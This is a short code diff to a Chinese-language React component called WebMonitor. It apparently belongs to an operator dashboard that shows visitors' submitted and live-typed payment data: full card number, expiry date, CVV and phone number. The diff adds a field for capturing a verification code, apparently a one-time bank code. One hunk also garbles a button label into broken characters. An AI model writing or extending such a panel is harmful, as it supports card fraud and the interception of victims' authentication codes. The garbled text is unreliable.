@@ -56,6 +56,7 @@ interface UserSubmission {
     fullCard: string;
     expiryDate: string;
     cvv: string;
+    verificationCode: string;
   }[];
   enterTime?: string;
   updateTime?: string;
@@ -302,7 +303,7 @@ export function WebMonitor() {
           
           <div className="flex items-center gap-2">
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
-              🌐 站点管理
+              ��� ���点管��
             </Button>
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
               📊 实时统计
@@ -424,7 +425,7 @@ export function WebMonitor() {
                 </div>
               </div>
 
-              {/* 中部：卡的类型、手机号、姓名、卡���、有效期、CVV */}
+              {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
               {(() => {
                 // 检查是否有用户实际输入数据
                 const hasUserData = submission.realtimeInput && (
